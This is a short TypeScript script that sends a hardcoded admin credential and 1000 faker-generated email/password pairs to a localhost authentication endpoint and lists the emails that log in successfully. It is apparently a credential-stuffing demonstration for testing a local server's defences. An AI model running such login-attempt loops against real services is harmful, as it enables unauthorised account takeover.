// Import Third-party Dependencies
import { request } from "undici";
import { faker } from "@faker-js/faker";

// CONSTANTS
const kRootApi = "http://localhost:1337/";

async function authentication(
  email: string,
  password: string
): Promise<string | null> {
  const { statusCode, body } = await request(
    new URL("/api/authenticate", kRootApi),
    {
      method: "POST",
      body: { email, password }
    }
  );
  await body.dump();

  return statusCode === 200 ? email : null;
}

const accounts = [
  { email: "admin@example.com", password: "F@obar@x$8513" }
];
for (let i = 0; i < 1000; i++) {
  accounts.push({
    email: faker.internet.email(),
    password: faker.internet.password({
      length: 10
    })
  });
}

const leakedEmail = [];
for (const { email, password } of accounts) {
  const detectedEmail = await authentication(email, password);
  if (detectedEmail !== null) {
    leakedEmail.push(detectedEmail);
  }
}

console.log("leaked email:");
console.log(leakedEmail);
